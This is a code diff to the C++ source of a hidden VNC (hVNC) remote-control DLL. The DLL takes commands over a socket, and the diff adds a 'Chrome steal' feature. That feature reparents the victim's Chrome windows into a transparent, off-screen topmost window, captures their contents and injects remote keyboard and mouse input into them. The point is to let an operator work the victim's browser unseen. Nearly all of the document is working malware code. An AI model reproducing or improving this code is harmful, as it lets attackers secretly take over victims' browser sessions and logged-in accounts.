@@ -127,6 +127,8 @@ static mutex g_logMutex;
 
 static atomic_bool g_chromeStealRunning(false);
 static HWND g_hChromeDummyParent = NULL;
+static HWND g_hChromeLastCapturedChild = NULL;
+static mutex g_chromeCaptureMutex;
 static thread g_chromeStealThread;
 static thread g_dummyParentThread;
 
@@ -694,6 +696,12 @@ static void capture_loop() {
                 if (IsWindowVisible(hwnd)) windows.push_back(hwnd);
                 hwnd = GetWindow(hwnd, GW_HWNDNEXT);
             }
+
+            // Add Chrome Dummy Parent if it's active
+            if (g_chromeStealRunning && g_hChromeDummyParent && IsWindow(g_hChromeDummyParent)) {
+                windows.push_back(g_hChromeDummyParent);
+            }
+
             reverse(windows.begin(), windows.end());
             lastWindowEnum = now;
         }
@@ -701,9 +709,28 @@ static void capture_loop() {
         const UINT printFlags = PW_RENDERFULLCONTENT;
 
         for (HWND h : windows) {
-            if (!IsWindow(h) || !IsWindowVisible(h)) continue;
+            if (!IsWindow(h)) continue;
             RECT rect;
-            if (!GetWindowRect(h, &rect)) continue;
+            if (h == g_hChromeDummyParent) {
+                // For the dummy parent, we want it to cover the hVNC screen
+                rect.left = 0; rect.top = 0;
+                rect.right = sw; rect.bottom = sh;
+
+                // Find the active child to capture
+                HWND hChild = GetWindow(g_hChromeDummyParent, GW_CHILD);
+                if (hChild) {
+                    h = hChild;
+                    lock_guard<mutex> lock(g_chromeCaptureMutex);
+                    g_hChromeLastCapturedChild = hChild;
+                } else {
+                    // If no child, just fill black
+                    FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
+                    continue;
+                }
+            } else {
+                if (!IsWindowVisible(h)) continue;
+                if (!GetWindowRect(h, &rect)) continue;
+            }
             int ww = rect.right - rect.left;
             int wh = rect.bottom - rect.top;
             if (ww <= 0 || wh <= 0) continue;
@@ -815,14 +842,18 @@ static WPARAM mouse_wparam_for_button(int btn, bool down) {
     return MK_LBUTTON;
 }
 
-static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
+static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt, bool isVirtual = false) {
     HWND current = hwnd;
     HWND best = hwnd;
 
     while (current && IsWindow(current)) {
         best = current;
         POINT clientPt = screenPt;
-        if (!ScreenToClient(current, &clientPt)) break;
+        if (isVirtual && current == hwnd) {
+            // Already in client coords for the root virtual window
+        } else {
+            if (!ScreenToClient(current, &clientPt)) break;
+        }
 
         HWND child = ChildWindowFromPoint(current, clientPt);
         if (!child || child == current) {
@@ -830,9 +861,17 @@ static HWND resolve_child_window_from_point(HWND hwnd, POINT screenPt) {
         }
         if (!child || child == current || !IsWindow(child)) break;
 
-        RECT childRect;
-        if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
+        // For virtual windows, we can't use GetWindowRect check easily as they are off-screen
+        if (!isVirtual) {
+            RECT childRect;
+            if (!GetWindowRect(child, &childRect) || !PtInRect(&childRect, screenPt)) break;
+        }
+
         current = child;
+        // After the first level, it's all relative to the parent anyway,
+        // so we don't need screenPt anymore if we keep updating clientPt?
+        // Actually the loop uses clientPt = screenPt and then ScreenToClient(current, &clientPt).
+        // If current is already a child, ScreenToClient works fine even if it's off-screen.
     }
 
     return best;
@@ -910,9 +949,9 @@ static HWND GetFocusedWindow() {
 //  input_loop – Klavye ve Mouse etkileşim iyileştirmeleri
 // -----------------------------------------------------------------------
 static void input_loop() {
-    ensure_desktop();
-    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
-    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
+    // Input loop handles redirection. We don't force SetThreadDesktop here anymore
+    // because some windows might be on Default and some on Hidden.
+    // ensure_desktop();
 
     while (g_inputRunning) {
         InputTask task;
@@ -930,7 +969,17 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = target_window_from_screen_point(g_lastMousePos);
+            HWND hTarget = NULL;
+
+            if (g_chromeStealRunning && g_hChromeDummyParent) {
+                {
+                    lock_guard<mutex> lock(g_chromeCaptureMutex);
+                    hTarget = g_hChromeLastCapturedChild; // Use the last captured child for focus/keys
+                }
+                if (!hTarget) hTarget = resolve_child_window_from_point(g_hChromeDummyParent, g_lastMousePos, true);
+            }
+
+            if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
@@ -989,7 +1038,12 @@ static void input_loop() {
                 }
 
             } else {
-                HWND hwnd = WindowFromPoint(screenPt);
+                HWND hwnd = NULL;
+                if (g_chromeStealRunning && g_hChromeDummyParent) {
+                    hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+                }
+                if (!hwnd) hwnd = WindowFromPoint(screenPt);
+
                 if (hwnd) {
                     LRESULT ht = HTCLIENT;
                     if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
@@ -1007,10 +1061,16 @@ static void input_loop() {
             g_forceFullFrame = true;
             int  btn  = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
-            HWND hwnd = WindowFromPoint(screenPt);
+
+            HWND hwnd = NULL;
+            if (g_chromeStealRunning && g_hChromeDummyParent) {
+                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+            }
+            if (!hwnd) hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
 
-            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+            HWND hRoot = (g_chromeStealRunning && g_hChromeDummyParent && (hwnd == g_hChromeDummyParent || GetParent(hwnd) == g_hChromeDummyParent))
+                         ? g_hChromeDummyParent : GetAncestor(hwnd, GA_ROOT);
             g_hLastWindow = hRoot;
 
             LRESULT ht = HTCLIENT;
@@ -1074,18 +1134,29 @@ static void input_loop() {
                 g_dragHwnd  = NULL;
             }
 
-            HWND hwnd = WindowFromPoint(screenPt);
+            HWND hwnd = NULL;
+            if (g_chromeStealRunning && g_hChromeDummyParent) {
+                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+            }
+            if (!hwnd) hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
 
             LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+            if (hwnd != g_hChromeDummyParent) {
+                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+            }
 
             if (ht != HTCLIENT) {
                 send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
             } else {
                 HWND hTarget = g_mouseDownTarget[btn];
-                if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(screenPt);
+                if (!hTarget || !IsWindow(hTarget)) {
+                    if (g_chromeStealRunning && g_hChromeDummyParent) {
+                        hTarget = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+                    }
+                    if (!hTarget) hTarget = target_window_from_screen_point(screenPt);
+                }
                 if (!hTarget) hTarget = hwnd;
 
                 POINT clientPt = screenPt;
@@ -1101,15 +1172,26 @@ static void input_loop() {
             g_forceFullFrame = true;
             int btn = cmd.value("button", 0);
             if (btn < 0 || btn > 2) btn = 0;
-            HWND hwnd = WindowFromPoint(screenPt);
+
+            HWND hwnd = NULL;
+            if (g_chromeStealRunning && g_hChromeDummyParent) {
+                hwnd = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+            }
+            if (!hwnd) hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
 
             LRESULT ht = HTCLIENT;
-            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
-                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+            if (hwnd != g_hChromeDummyParent) {
+                SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                    SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+            }
 
             if (ht == HTCLIENT) {
-                HWND hTarget = target_window_from_screen_point(screenPt);
+                HWND hTarget = NULL;
+                if (g_chromeStealRunning && g_hChromeDummyParent) {
+                    hTarget = resolve_child_window_from_point(g_hChromeDummyParent, screenPt, true);
+                }
+                if (!hTarget) hTarget = target_window_from_screen_point(screenPt);
                 if (!hTarget) hTarget = hwnd;
                 activate_target_window(hTarget, mouse_message_for_button(btn, true, btn == 0), ht);
 
@@ -1150,23 +1232,27 @@ static LRESULT CALLBACK DummyParentWndProc(HWND hwnd, UINT msg, WPARAM wParam, L
 }
 
 static void dummy_parent_worker() {
-    ensure_desktop();
-    if (!g_hHiddenDesktop) return;
-    if (!SetThreadDesktop(g_hHiddenDesktop)) return;
-
+    // Run on DEFAULT desktop so SetParent works easily, but keep it hidden from the user
     WNDCLASSW wc = {0};
     wc.lpfnWndProc = DummyParentWndProc;
     wc.hInstance = GetModuleHandle(NULL);
     wc.lpszClassName = L"ChromeStealParent";
     RegisterClassW(&wc);
 
-    g_hChromeDummyParent = CreateWindowExW(0, wc.lpszClassName, L"Chrome Dummy Parent", WS_POPUP,
-                                           0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+
+    // Create the window off-screen but "visible" so PrintWindow works
+    g_hChromeDummyParent = CreateWindowExW(WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_LAYERED, wc.lpszClassName, L"Chrome Dummy Parent", WS_POPUP,
+                                           -sw - 100, -sh - 100, sw, sh,
                                            NULL, NULL, wc.hInstance, NULL);
 
     if (!g_hChromeDummyParent) return;
 
-    ShowWindow(g_hChromeDummyParent, SW_HIDE);
+    // Make it fully transparent just in case it's ever moved to the visible area
+    SetLayeredWindowAttributes(g_hChromeDummyParent, 0, 0, LWA_ALPHA);
+
+    ShowWindow(g_hChromeDummyParent, SW_SHOW);
 
     MSG msg;
     while (g_chromeStealRunning && GetMessageW(&msg, NULL, 0, 0)) {
@@ -1177,6 +1263,8 @@ static void dummy_parent_worker() {
     if (g_hChromeDummyParent) {
         DestroyWindow(g_hChromeDummyParent);
         g_hChromeDummyParent = NULL;
+        lock_guard<mutex> lock(g_chromeCaptureMutex);
+        g_hChromeLastCapturedChild = NULL;
     }
 }
 
@@ -1200,6 +1288,10 @@ static BOOL CALLBACK EnumStealProc(HWND hwnd, LPARAM lParam) {
     RECT rc;
     GetClientRect(g_hChromeDummyParent, &rc);
     SetWindowPos(hwnd, NULL, 0, 0, rc.right, rc.bottom, SWP_NOZORDER | SWP_SHOWWINDOW);
+
+    // Force some children visibility and focus
+    SetForegroundWindow(hwnd);
+    SetFocus(hwnd);
 
     return TRUE;
 }
@@ -1254,7 +1346,14 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             }
             if (!g_inputRunning.exchange(true)) {
                 if (g_inputThread.joinable()) g_inputThread.join();
-                g_inputThread = thread(input_loop);
+
+                // Set desktop to hidden for the input thread to ensure it can interact with hidden desktop by default
+                // though individual redirections will handle default desktop windows.
+                g_inputThread = thread([]() {
+                    ensure_desktop();
+                    if (g_hHiddenDesktop) SetThreadDesktop(g_hHiddenDesktop);
+                    input_loop();
+                });
             }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
